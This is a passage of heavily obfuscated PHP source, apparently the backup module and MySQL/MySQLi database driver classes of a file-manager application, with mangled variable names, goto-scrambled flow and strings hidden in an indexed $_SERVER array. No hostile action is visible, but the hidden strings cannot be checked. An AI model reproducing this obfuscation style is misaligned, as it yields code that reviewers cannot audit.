$e§œ›éñØï =& $_SERVER[³‘’¼äÑ™ÔÍ]; $aÉ£µŸÏäö = Model($e§œ›éñØï[707])->listData($c®‘´Ó–Å¶); Model($e§œ›éñØï[707])->checkConfig($aÉ£µŸÏäö); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[³‘’¼äÑ™ÔÍ][691])->findByName(self::$name); } return self::$option; } public static function set($EÊğòÉ¶ÒÙ) { $F °íâİòÍ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $däøäøÌÛ = self::get(); foreach ($EÊğòÉ¶ÒÙ as $AéĞ–‘ŠÊİ => $DÇÚâÍÉÌ·) { $E çğ½Öî  = explode($F °íâİòÍ[91], $AéĞ–‘ŠÊİ); $fØ²©˜Ã” = count($E çğ½Öî ); switch ($fØ²©˜Ã”) { case 1: $däøäøÌÛ[$E çğ½Öî [0]] = $DÇÚâÍÉÌ·; break; case 2: $däøäøÌÛ[$E çğ½Öî [0]][$E çğ½Öî [1]] = $DÇÚâÍÉÌ·; break; case 3: $däøäøÌÛ[$E çğ½Öî [0]][$E çğ½Öî [1]][$E çğ½Öî [2]] = $DÇÚâÍÉÌ·; break; } } Model($F °íâİòÍ[691])->update($däøäøÌÛ[$F °íâİòÍ[367]], $däøäøÌÛ); self::$option = $däøäøÌÛ; return self::$option; } public function keep() { $fˆê‰Š‰»‹ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $FóŞ Ï„—Ğ = self::get(); if ($FóŞ Ï„—Ğ[$fˆê‰Š‰»‹[281]][$fˆê‰Š‰»‹[696]][$fˆê‰Š‰»‹[692]] == $fˆê‰Š‰»‹[83]) { return; } $this->backupKeep($FóŞ Ï„—Ğ); self::set(array($fˆê‰Š‰»‹[708] => 1)); } private function backupKeep($E«”Ö×Ñ˜Ş) { goto E–‹”„±œ; E–‹”„±œ: $d‹£Ùš…Ò =& $_SERVER[³‘’¼äÑ™ÔÍ]; $d¾ˆÜ¯±‰ø = Model($d‹£Ùš…Ò[691])->listData(); if (empty($d¾ˆÜ¯±‰ø)) { return; } goto dçĞÕĞÔ½Ì; AæËÜÜÊ•â: for ($A„†ÛÖª‡· = 0; $A„†ÛÖª‡· < 12; $A„†ÛÖª‡·++) { $b‰·½ÄÂæ«[] = date($d‹£Ùš…Ò[709], strtotime("\x2d{$A„†ÛÖª‡·}\x20\x6d\x6f\156\164\150\x73")); } $b‰·½ÄÂæ« = array_unique($b‰·½ÄÂæ«); foreach ($d¾ˆÜ¯±‰ø as $D×›ãÉÇÚ¡) { if (!empty($D×›ãÉÇÚ¡[$d‹£Ùš…Ò[28]]) && in_array($D×›ãÉÇÚ¡[$d‹£Ùš…Ò[28]], $b‰·½ÄÂæ«)) { continue; } Model($d‹£Ùš…Ò[691])->remove($D×›ãÉÇÚ¡[$d‹£Ùš…Ò[367]]); $dÂ÷‚›»‰ = "\173\151\x6f\72{$E«”Ö×Ñ˜Ş[$d‹£Ùš…Ò[694]]}\x7d\57\144\x61\164\141\x62\141\163\145\57\142\141\x63\153\165\x70\137{$D×›ãÉÇÚ¡[$d‹£Ùš…Ò[28]]}"; IO::remove($dÂ÷‚›»‰, !1); } goto e¸çŸ÷”ÄÍ; dçĞÕĞÔ½Ì: $A„†ÛÖª‡· = 0; $b‰·½ÄÂæ« = array(); foreach ($d¾ˆÜ¯±‰ø as $D×›ãÉÇÚ¡) { if ($A„†ÛÖª‡· >= 7) { break; } $b‰·½ÄÂæ«[] = $D×›ãÉÇÚ¡[$d‹£Ùš…Ò[28]]; $A„†ÛÖª‡·++; } goto AæËÜÜÊ•â; e¸çŸ÷”ÄÍ: } public function db() { goto AÕ‰óƒ´Â; AÕ‰óƒ´Â: $C½±ÁÕšª¢ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $C©¯õ›Æ…– = self::get(); if ($C©¯õ›Æ…–[$C½±ÁÕšª¢[281]][$C½±ÁÕšª¢[697]][$C½±ÁÕšª¢[692]] == $C½±ÁÕšª¢[83]) { return !0; } goto dš„–±óñì; d¤Óšğâ»: return !0; goto fñ“‹Îëà; dš„–±óñì: $E‡òŠÃ×á = new BackupDb(); if (!$E‡òŠÃ×á->index()) { return !1; } self::set(array($C½±ÁÕšª¢[710] => 1)); goto d¤Óšğâ»; fñ“‹Îëà: } public function dbFile() { goto bìì§ØøÂñ; CĞÂ„ƒ­ ©: return !0; goto eÒ‹øˆšÏ­; Eê¾š™Àõ‰: $cÓìá®Ÿ…î = new BackupDbFile(); if (!$cÓìá®Ÿ…î->index()) { return !1; } self::set(array($FÄ¿÷•—–á[711] => 1)); goto CĞÂ„ƒ­ ©; bìì§ØøÂñ: $FÄ¿÷•—–á =& $_SERVER[³‘’¼äÑ™ÔÍ]; $bìŞé¦Ç¡½ = self::get(); if ($bìŞé¦Ç¡½[$FÄ¿÷•—–á[281]][$FÄ¿÷•—–á[700]][$FÄ¿÷•—–á[692]] == $FÄ¿÷•—–á[83]) { return !0; } goto Eê¾š™Àõ‰; eÒ‹øˆšÏ­: } public function file() { $d•ò÷²‚Àå =& $_SERVER[³‘’¼äÑ™ÔÍ]; $cÈÛ«Œ˜ƒÊ = self::get(); if ($cÈÛ«Œ˜ƒÊ[$d•ò÷²‚Àå[281]][$d•ò÷²‚Àå[167]][$d•ò÷²‚Àå[692]] == $d•ò÷²‚Àå[83]) { return !0; } if (!isset($cÈÛ«Œ˜ƒÊ[$d•ò÷²‚Àå[695]]) || $cÈÛ«Œ˜ƒÊ[$d•ò÷²‚Àå[695]] == $d•ò÷²‚Àå[468]) { $EÈí£…íœÜ = new BackupFile(); if (!$EÈí£…íœÜ->index()) { return !1; } } self::set(array($d•ò÷²‚Àå[712] => 1, $d•ò÷²‚Àå[692] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto e×··¼¾»Œ; D‚šÖ¢ğõ: foreach ($bª§œˆ¾ë as $B‰±°¡Ì…•) { $bğ³„¿²Û° = $aª‰¼²Ñì . $B‰±°¡Ì…• . $fâ’¡Ù÷ã[721]; $fŒíˆÆõÛ = null; if ($B‰±°¡Ì…• == $fâ’¡Ù÷ã[722] && (!isset($aƒ–¿Ù¨Ã‰[$fâ’¡Ù÷ã[695]]) || $aƒ–¿Ù¨Ã‰[$fâ’¡Ù÷ã[695]] == $fâ’¡Ù÷ã[468])) { $fŒíˆÆõÛ = self::$io; } $DÀ±íŒÚëÙ += $f‹Ûøø™ğ->sqlFromDb($B‰±°¡Ì…•, $bğ³„¿²Û°, $C’ˆŒµ¿Õ, $fŒíˆÆõÛ); } $C’ˆŒµ¿Õ->end(); $aºµ¬‘ˆà = array($fâ’¡Ù÷ã[723] => $dØ±ã©ß™®, $fâ’¡Ù÷ã[710] => 1, $fâ’¡Ù÷ã[724] => $DÀ±íŒÚëÙ, $fâ’¡Ù÷ã[725] => $DÀ±íŒÚëÙ); goto A³ƒÍÃ®ËË; e×··¼¾»Œ: $fâ’¡Ù÷ã =& $_SERVER[³‘’¼äÑ™ÔÍ]; $aƒ–¿Ù¨Ã‰ = Backup::get(); self::$io = $aƒ–¿Ù¨Ã‰[$fâ’¡Ù÷ã[694]]; goto E†èŠ¿¶¬Î; BÚÎ×õËĞ: $f‹Ûøø™ğ = new DbManage($açµ„¾¸, $dØ±ã©ß™®); $aª‰¼²Ñì = TEMP_FILES . $fâ’¡Ù÷ã[713] . self::$name . $fâ’¡Ù÷ã[8]; del_dir($aª‰¼²Ñì); goto b¿Î†ŠöÅ; EÛ¿“–ö²œ: $bª§œˆ¾ë = array_diff($bª§œˆ¾ë, array($fâ’¡Ù÷ã[714], $fâ’¡Ù÷ã[715])); foreach ($bª§œˆ¾ë as $B‰±°¡Ì…•) { $aëÇ“Ÿ¼‡Œ += $f‹Ûøø™ğ->model($B‰±°¡Ì…•)->count(); } $C’ˆŒµ¿Õ = new Task($fâ’¡Ù÷ã[716], $fâ’¡Ù÷ã[717], $aëÇ“Ÿ¼‡Œ, LNG($fâ’¡Ù÷ã[718]) . $fâ’¡Ù÷ã[719] . LNG($fâ’¡Ù÷ã[720])); goto D‚šÖ¢ğõ; E†èŠ¿¶¬Î: self::$name = $aƒ–¿Ù¨Ã‰[$fâ’¡Ù÷ã[28]]; $açµ„¾¸ = $GLOBALS[$fâ’¡Ù÷ã[6]][$fâ’¡Ù÷ã[17]]; $dØ±ã©ß™® = $this->_dbType($açµ„¾¸); goto BÚÎ×õËĞ; A³ƒÍÃ®ËË: Backup::set($aºµ¬‘ˆà); return !0; goto DÜì™»©í; b¿Î†ŠöÅ: mk_dir($aª‰¼²Ñì); $aëÇ“Ÿ¼‡Œ = $DÀ±íŒÚëÙ = 0; $bª§œˆ¾ë = $f‹Ûøø™ğ->db()->getTables(); goto EÛ¿“–ö²œ; DÜì™»©í: } private function _dbType($fÁêØŸÔæ) { goto d‰ç˜¤…‘’; F±ãİÆˆ«¶: return $dÃèŒ¥åõ; goto aæ…º×›Ô£; d‰ç˜¤…‘’: $Bƒ’µÆší =& $_SERVER[³‘’¼äÑ™ÔÍ]; $fÁêØŸÔæ = array_change_key_case($fÁêØŸÔæ); $dÃèŒ¥åõ = $fÁêØŸÔæ[$Bƒ’µÆší[726]]; goto D˜µ’µÓÓù; D˜µ’µÓÓù: if ($dÃèŒ¥åõ == $Bƒ’µÆší[727]) { $cËæó÷å´ = explode($Bƒ’µÆší[4], $fÁêØŸÔæ[$Bƒ’µÆší[728]]); $dÃèŒ¥åõ = $cËæó÷å´[0]; } $FŞ§¹ñÅ±Ó = array($Bƒ’µÆší[729] => $Bƒ’µÆší[9], $Bƒ’µÆší[730] => $Bƒ’µÆší[731]); if (isset($FŞ§¹ñÅ±Ó[$dÃèŒ¥åõ])) { $dÃèŒ¥åõ = $FŞ§¹ñÅ±Ó[$dÃèŒ¥åõ]; } goto F±ãİÆˆ«¶; aæ…º×›Ô£: } } class BackupDbFile { public function __construct() { } public function index() { goto FïäåÄŠø; C–½«¿È¡»: $f‡ÚÃßÚùº = TEMP_FILES . "\x62\141\143\153\x75\160\x5f{$EÂˆÖŒâ¤†}\x2f"; $AíÙ¿í“í² = "\x7b\151\157\x3a{$eá±áëƒöÏ[$EÂë„¹é[694]]}\175\57\144\141\164\141\142\x61\x73\145\57"; IO::mkdir($AíÙ¿í“í² . "\x62\x61\x63\153\165\160\x5f{$EÂˆÖŒâ¤†}\57"); goto B°“İéåŒ­; F· ‰Š¡¾´: $d½éõêµäã = CONTROLLER_DIR . $EÂë„¹é[736]; IO::copy($c„à½ÒÎ…, $AíÙ¿í“í² . "\142\141\x63\153\165\160\137{$EÂˆÖŒâ¤†}\57"); IO::copy($d½éõêµäã, $AíÙ¿í“í² . "\142\x61\x63\153\165\160\x5f{$EÂˆÖŒâ¤†}\x2f"); goto A¤ˆÖ‘ƒ®÷; FïäåÄŠø: $EÂë„¹é =& $_SERVER[³‘’¼äÑ™ÔÍ]; $eá±áëƒöÏ = Backup::get(); $EÂˆÖŒâ¤† = $eá±áëƒöÏ[$EÂë„¹é[28]]; goto C–½«¿È¡»; A¤ˆÖ‘ƒ®÷: $aÍ›ù…Ë->end(); Backup::set(array($EÂë„¹é[737] => $BÆìà«ËÚ[$EÂë„¹é[77]])); return !0; goto E¶•ô¢ö¢£; E¾ÈßìŠË‡: Backup::set(array($EÂë„¹é[734] => $BÆìà«ËÚ[$EÂë„¹é[77]])); IO::move($f‡ÚÃßÚùº, $AíÙ¿í“í²); $c„à½ÒÎ… = CONTROLLER_DIR . $EÂë„¹é[735]; goto F· ‰Š¡¾´; B°“İéåŒ­: $aÍ›ù…Ë = new TaskFileTransfer($EÂë„¹é[732], $EÂë„¹é[717], 0, LNG($EÂë„¹é[718]) . $EÂë„¹é[412] . LNG($EÂë„¹é[720]) . $EÂë„¹é[733]); $aÍ›ù…Ë->addPath($f‡ÚÃßÚùº); $BÆìà«ËÚ = IO::infoWithChildren($f‡ÚÃßÚùº); goto E¾ÈßìŠË‡; E¶•ô¢ö¢£: } } goto d˜æÓĞŸ†¹; a´Ì’Àˆ¤: class DbMysql extends Db { public function __construct($b´Â—®Î = '') { $AÄåéÁ‹ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!extension_loaded($AÄåéÁ‹[731])) { think_exception(think_lang($AÄåéÁ‹[10]) . $AÄåéÁ‹[802]); } if (!empty($b´Â—®Î)) { $this->config = $b´Â—®Î; if (empty($this->config[$AÄåéÁ‹[13]])) { $this->config[$AÄåéÁ‹[13]] = $AÄåéÁ‹[33]; } } } public function connect($bíé„‘ˆ’  = '', $eó©÷´±’ = 0, $BäŸÌÂÏ¡ = false) { $eÕ‘êÚ“Ğ¢ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!isset($this->linkID[$eó©÷´±’])) { goto bàÀ¤´èãº; AÁ²ÑÕÌ: if ($Bª…ôòã) { $this->linkID[$eó©÷´±’] = mysql_pconnect($ağ‚…ÓõÒ¤, $bíé„‘ˆ’ [$eÕ‘êÚ“Ğ¢[805]], $bíé„‘ˆ’ [$eÕ‘êÚ“Ğ¢[806]], 131072); } else { $this->linkID[$eó©÷´±’] = mysql_connect($ağ‚…ÓõÒ¤, $bíé„‘ˆ’ [$eÕ‘êÚ“Ğ¢[805]], $bíé„‘ˆ’ [$eÕ‘êÚ“Ğ¢[806]], !0, 131072); } if (!$this->linkID[$eó©÷´±’] || !empty($bíé„‘ˆ’ [$eÕ‘êÚ“Ğ¢[17]]) && !mysql_select_db($bíé„‘ˆ’ [$eÕ‘êÚ“Ğ¢[17]], $this->linkID[$eó©÷´±’])) { think_exception(mysql_error()); } $eäªÄâÀ½ï = mysql_get_server_info($this->linkID[$eó©÷´±’]); goto f§‘Ë “ÏÒ; f§‘Ë “ÏÒ: mysql_query($eÕ‘êÚ“Ğ¢[807] . think_config($eÕ‘êÚ“Ğ¢[808]) . $eÕ‘êÚ“Ğ¢[55], $this->linkID[$eó©÷´±’]); if ($eäªÄâÀ½ï > $eÕ‘êÚ“Ğ¢[809]) { mysql_query($eÕ‘êÚ“Ğ¢[810], $this->linkID[$eó©÷´±’]); } $this->connected = !0; goto E¿à®‹Ä½Ã; bàÀ¤´èãº: if (empty($bíé„‘ˆ’ )) { $bíé„‘ˆ’  = $this->config; } $ağ‚…ÓõÒ¤ = $bíé„‘ˆ’ [$eÕ‘êÚ“Ğ¢[803]] . ($bíé„‘ˆ’ [$eÕ‘êÚ“Ğ¢[804]] ? "\72{$bíé„‘ˆ’ [$eÕ‘êÚ“Ğ¢[804]]}" : $eÕ‘êÚ“Ğ¢[33]); $Bª…ôòã = !empty($bíé„‘ˆ’ [$eÕ‘êÚ“Ğ¢[13]][$eÕ‘êÚ“Ğ¢[14]]) ? $bíé„‘ˆ’ [$eÕ‘êÚ“Ğ¢[13]][$eÕ‘êÚ“Ğ¢[14]] : $this->pconnect; goto AÁ²ÑÕÌ; E¿à®‹Ä½Ã: if (1 != think_config($eÕ‘êÚ“Ğ¢[18])) { unset($this->config); } goto f¡ñíî™Ôî; f¡ñíî™Ôî: } return $this->linkID[$eó©÷´±’]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($aÓê–ŠÕ´Ô) { goto CŸÑê™; cÁÁíÔ²: think_action_status($AÜáèâ¢[19], 1); think_status($AÜáèâ¢[20]); $this->queryID = mysql_query($aÓê–ŠÕ´Ô, $this->_linkID); goto d …‹íå›Ô; e˜¼®Î›êò: if (!$this->_linkID) { return !1; } $this->queryStr = $aÓê–ŠÕ´Ô; if ($this->queryID) { $this->free(); } goto cÁÁíÔ²; CŸÑê™: $AÜáèâ¢ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (0 === stripos($aÓê–ŠÕ´Ô, $AÜáèâ¢[252])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto e˜¼®Î›êò; d …‹íå›Ô: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto BÙñ„éïë’; BÙñ„éïë’: } public function execute($A§½÷¶”ñï) { goto A–ñÛ×öáñ; Fçóá£å·: if (!1 === $b…¡”ÏŠğË) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto F²ö¶ÎíÙˆ; A–ñÛ×öáñ: $Eäƒ÷Â–óè =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto C¤ˆÌ¬¦™í; D…¡¿öÆ‡Ö: think_status($Eäƒ÷Â–óè[20]); $b…¡”ÏŠğË = mysql_query($A§½÷¶”ñï, $this->_linkID); $this->debug(); goto Fçóá£å·; C¤ˆÌ¬¦™í: $this->queryStr = $A§½÷¶”ñï; if ($this->queryID) { $this->free(); } think_action_status($Eäƒ÷Â–óè[21], 1); goto D…¡¿öÆ‡Ö; F²ö¶ÎíÙˆ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[³‘’¼äÑ™ÔÍ][811], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $f…‰Ã¸Ò = mysql_query($_SERVER[³‘’¼äÑ™ÔÍ][812], $this->_linkID); $this->transTimes = 0; if (!$f…‰Ã¸Ò) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $dì…¶Õ½ = mysql_query($_SERVER[³‘’¼äÑ™ÔÍ][813], $this->_linkID); $this->transTimes = 0; if (!$dì…¶Õ½) { $this->error(); return !1; } } return !0; } private function getAll() { $e‘½ší†Öß = array(); if ($this->numRows > 0) { while ($b•§¿í±¸À = mysql_fetch_assoc($this->queryID)) { $e‘½ší†Öß[] = $b•§¿í±¸À; } mysql_data_seek($this->queryID, 0); } return $e‘½ší†Öß; } public function getFields($eø¼‹íŸ¿) { $Eâª’›ÕŒæ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $A¼¹¯ŸµŒĞ = $this->query($Eâª’›ÕŒæ[814] . $this->parseKey($eø¼‹íŸ¿)); $AœÃöİßÓ² = array(); if ($A¼¹¯ŸµŒĞ) { foreach ($A¼¹¯ŸµŒĞ as $bÁ’¼âø› => $f¿øÅÔ°ø©) { $AœÃöİßÓ²[$f¿øÅÔ°ø©[$Eâª’›ÕŒæ[27]]] = array($Eâª’›ÕŒæ[28] => $f¿øÅÔ°ø©[$Eâª’›ÕŒæ[27]], $Eâª’›ÕŒæ[29] => $f¿øÅÔ°ø©[$Eâª’›ÕŒæ[30]], $Eâª’›ÕŒæ[31] => (bool) (strtoupper($f¿øÅÔ°ø©[$Eâª’›ÕŒæ[32]]) === $Eâª’›ÕŒæ[815]), $Eâª’›ÕŒæ[34] => $f¿øÅÔ°ø©[$Eâª’›ÕŒæ[35]], $Eâª’›ÕŒæ[36] => strtolower($f¿øÅÔ°ø©[$Eâª’›ÕŒæ[37]]) == $Eâª’›ÕŒæ[38], $Eâª’›ÕŒæ[39] => strtolower($f¿øÅÔ°ø©[$Eâª’›ÕŒæ[40]]) == $Eâª’›ÕŒæ[41]); } } return $AœÃöİßÓ²; } public function getTables($A÷ÛÄ…‹°¸ = '') { $Eø´‹Îëõ‰ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!empty($A÷ÛÄ…‹°¸)) { $A‹Ää¼šŸÑ = $Eø´‹Îëõ‰[816] . $A÷ÛÄ…‹°¸; } else { $A‹Ää¼šŸÑ = $Eø´‹Îëõ‰[817]; } $f¶Ù´Øİ„ = $this->query($A‹Ää¼šŸÑ); $dõªÖ©ÃõÑ = array(); foreach ($f¶Ù´Øİ„ as $dù‰Æ¶¶¾– => $CÁëÔÙœ¦) { $dõªÖ©ÃõÑ[$dù‰Æ¶¶¾–] = current($CÁëÔÙœ¦); } return $dõªÖ©ÃõÑ; } public function replace($F±É¤§¦ç¯, $F¨ÎÒ¿¶…î = array()) { $AŸŞ«Ü¼Û© =& $_SERVER[³‘’¼äÑ™ÔÍ]; foreach ($F±É¤§¦ç¯ as $e­‚ã÷×ä => $AÏ™ò¯Ü¾) { $d¤ˆ›‡ßğª = $this->parseValue($AÏ™ò¯Ü¾); if (is_scalar($d¤ˆ›‡ßğª)) { $EïÀ¦ç¬†[] = $d¤ˆ›‡ßğª; $e›Ê¢ï½†æ[] = $this->parseKey($e­‚ã÷×ä); } } $eù’øÆ¡¨ = $AŸŞ«Ü¼Û©[818] . $this->parseTable($F¨ÎÒ¿¶…î[$AŸŞ«Ü¼Û©[267]]) . $AŸŞ«Ü¼Û©[819] . implode($AŸŞ«Ü¼Û©[47], $e›Ê¢ï½†æ) . $AŸŞ«Ü¼Û©[820] . implode($AŸŞ«Ü¼Û©[47], $EïÀ¦ç¬†) . $AŸŞ«Ü¼Û©[821]; return $this->execute($eù’øÆ¡¨); } public function insertAll($BŠÊƒ† —Ö, $EŞ²®”™‰ = array(), $cÜÊ¢§îô = false) { goto cä¥·°ëŸ; b½°ï‡š«: $aƒ¹ Œ¿¡¼ = array(); foreach ($BŠÊƒ† —Ö as $fÙì¯‰£‚ê) { $A‚®³ÆÉù« = array(); foreach ($fÙì¯‰£‚ê as $F¢ƒ„œé¦Ø => $bŠíÊŠ¼ø) { $bŠíÊŠ¼ø = $this->parseValue($bŠíÊŠ¼ø); if (is_scalar($bŠíÊŠ¼ø)) { $A‚®³ÆÉù«[] = $bŠíÊŠ¼ø; } } $aƒ¹ Œ¿¡¼[] = $DÆ„ƒİÑÎ[248] . implode($DÆ„ƒİÑÎ[47], $A‚®³ÆÉù«) . $DÆ„ƒİÑÎ[821]; } array_walk($e Ò‡ÁÁäÉ, array($this, $DÆ„ƒİÑÎ[822])); goto Dî‹«†Ì³; cä¥·°ëŸ: $DÆ„ƒİÑÎ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!is_array($BŠÊƒ† —Ö[0])) { return !1; } $e Ò‡ÁÁäÉ = array_keys($BŠÊƒ† —Ö[0]); goto b½°ï‡š«; Dî‹«†Ì³: $FŒÁƒİøÕ = ($cÜÊ¢§îô ? $DÆ„ƒİÑÎ[823] : $DÆ„ƒİÑÎ[824]) . $DÆ„ƒİÑÎ[825] . $this->parseTable($EŞ²®”™‰[$DÆ„ƒİÑÎ[267]]) . $DÆ„ƒİÑÎ[819] . implode($DÆ„ƒİÑÎ[47], $e Ò‡ÁÁäÉ) . $DÆ„ƒİÑÎ[826] . implode($DÆ„ƒİÑÎ[47], $aƒ¹ Œ¿¡¼); return $this->execute($FŒÁƒİøÕ); goto EŞõÒºõ‹–; EŞõÒºõ‹–: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Fßˆ³ËÄ¢« =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->error = mysql_errno() . $Fßˆ³ËÄ¢«[4] . mysql_error($this->_linkID); if ($Fßˆ³ËÄ¢«[33] != $this->queryStr) { $this->error .= LNG($Fßˆ³ËÄ¢«[45]) . $this->queryStr; } think_trace($this->error, $Fßˆ³ËÄ¢«[33], $Fßˆ³ËÄ¢«[46]); return $this->error; } public function escapeString($aÃÆ’·‡¬Œ) { if ($this->_linkID) { return mysql_real_escape_string($aÃÆ’·‡¬Œ, $this->_linkID); } else { return mysql_escape_string($aÃÆ’·‡¬Œ); } } public function parseKey(&$E¾ÀñÜ“¯, $EÜÔĞ“ŒçÂ = true) { $bÈ²à‹ˆ—¼ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($EÜÔĞ“ŒçÂ) { $E¾ÀñÜ“¯ = $this->parseKeyCheck($E¾ÀñÜ“¯); } if ($E¾ÀñÜ“¯ != $bÈ²à‹ˆ—¼[176] && !preg_match($bÈ²à‹ˆ—¼[827], $E¾ÀñÜ“¯)) { $E¾ÀñÜ“¯ = $bÈ²à‹ˆ—¼[828] . trim($E¾ÀñÜ“¯, $bÈ²à‹ˆ—¼[828]) . $bÈ²à‹ˆ—¼[828]; } return $E¾ÀñÜ“¯; } } class DbMysqli extends Db { public function __construct($d‰˜Æ…Š‘ó = '') { $b¹ïÇ Õ¿™ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!extension_loaded($b¹ïÇ Õ¿™[730])) { think_exception(think_lang($b¹ïÇ Õ¿™[10]) . $b¹ïÇ Õ¿™[829]); } if (!empty($d‰˜Æ…Š‘ó)) { $this->config = $d‰˜Æ…Š‘ó; if (empty($this->config[$b¹ïÇ Õ¿™[13]])) { $this->config[$b¹ïÇ Õ¿™[13]] = $b¹ïÇ Õ¿™[33]; } } } public function connect($e‡‰ªî·»‹ = '', $FŒäëÍ = 0) { $Aİ¸ëŞß¸ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!isset($this->linkID[$FŒäëÍ])) { goto A³óˆ‚Í; A³óˆ‚Í: if (empty($e‡‰ªî·»‹)) { $e‡‰ªî·»‹ = $this->config; } $this->linkID[$FŒäëÍ] = new mysqli($e‡‰ªî·»‹[$Aİ¸ëŞß¸[803]], $e‡‰ªî·»‹[$Aİ¸ëŞß¸[805]], $e‡‰ªî·»‹[$Aİ¸ëŞß¸[806]], $e‡‰ªî·»‹[$Aİ¸ëŞß¸[17]], $e‡‰ªî·»‹[$Aİ¸ëŞß¸[804]] ? intval($e‡‰ªî·»‹[$Aİ¸ëŞß¸[804]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto Aà÷÷’Íâó; Aà÷÷’Íâó: $b»Š©‘Æ = $this->linkID[$FŒäëÍ]->server_version; $this->linkID[$FŒäëÍ]->query($Aİ¸ëŞß¸[807] . think_config($Aİ¸ëŞß¸[808]) . $Aİ¸ëŞß¸[55]); if ($b»Š©‘Æ > $Aİ¸ëŞß¸[809]) { $this->linkID[$FŒäëÍ]->query($Aİ¸ëŞß¸[810]); } goto ašºÜÊïßœ; ašºÜÊïßœ: $this->connected = !0; if (1 != think_config($Aİ¸ëŞß¸[18])) { unset($this->config); } goto EËªªÓ÷Á; EËªªÓ÷Á: } return $this->linkID[$FŒäëÍ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($bœŠñßğ°) { goto AÌà§š˜é„; bËÛ˜ã¦Ì: $this->queryStr = $bœŠñßğ°; if ($this->queryID) { $this->free(); } think_action_status($d‰¶«¼ÂÅ[19], 1); goto bÀŒÕÖÇ†–; AÌà§š˜é„: $d‰¶«¼ÂÅ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto bËÛ˜ã¦Ì; AÆĞ¦å¸¼: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto E½ß†®°ìÏ; bÀŒÕÖÇ†–: think_status($d‰¶«¼ÂÅ[20]); $this->queryID = $this->_linkID->query($bœŠñßğ°); if ($this->_linkID->more_results()) { while (($AÎ‘à˜ù„ = $this->_linkID->next_result()) != NULL) { $AÎ‘à˜ù„->free_result(); } } goto AÆĞ¦å¸¼; E½ß†®°ìÏ: } public function execute($Dˆ¡ª‡Ãö) { goto c³ŒˆÔ›ãç; C‹ÇÄ–Æ×Ë: $this->queryStr = $Dˆ¡ª‡Ãö; if ($this->queryID) { $this->free(); } think_action_status($däŞ—ÛÇ‘”[21], 1); goto EİÉÀ£íìí; c³ŒˆÔ›ãç: $däŞ—ÛÇ‘” =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto C‹ÇÄ–Æ×Ë; cœ—¾£ö: if (!1 === $cğ Ó“‰ëï) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto FîÉ„¹ùö½; EİÉÀ£íìí: think_status($däŞ—ÛÇ‘”[20]); $cğ Ó“‰ëï = $this->_linkID->query($Dˆ¡ª‡Ãö); $this->debug(); goto cœ—¾£ö; FîÉ„¹ùö½: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $a‡øÛÒàµ× = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$a‡øÛÒàµ×) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $D¢ÜÜŸªÉ… = $this->_linkID->rollback(); $this->transTimes = 0; if (!$D¢ÜÜŸªÉ…) { $this->error(); return !1; } } return !0; } private function getAll() { $aƒÃÕœÙŒ = array(); if ($this->numRows > 0) { for ($fÏÎ‚¼§‡ğ = 0; $fÏÎ‚¼§‡ğ < $this->numRows; $fÏÎ‚¼§‡ğ++) { $aƒÃÕœÙŒ[$fÏÎ‚¼§‡ğ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $aƒÃÕœÙŒ; } public function getFields($Eõ”‚Ì”…¶) { $FÑ„‚°©§˜ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $bœœÛñŞ‰ = $this->query($FÑ„‚°©§˜[814] . $this->parseKey($Eõ”‚Ì”…¶)); $e†áêÃß®¾ = array(); if ($bœœÛñŞ‰) { foreach ($bœœÛñŞ‰ as $E˜Õ’Ö–§ => $cÆ½ÎÌ›ùò) { $e†áêÃß®¾[$cÆ½ÎÌ›ùò[$FÑ„‚°©§˜[27]]] = array($FÑ„‚°©§˜[28] => $cÆ½ÎÌ›ùò[$FÑ„‚°©§˜[27]], $FÑ„‚°©§˜[29] => $cÆ½ÎÌ›ùò[$FÑ„‚°©§˜[30]], $FÑ„‚°©§˜[31] => (bool) ($cÆ½ÎÌ›ùò[$FÑ„‚°©§˜[32]] === 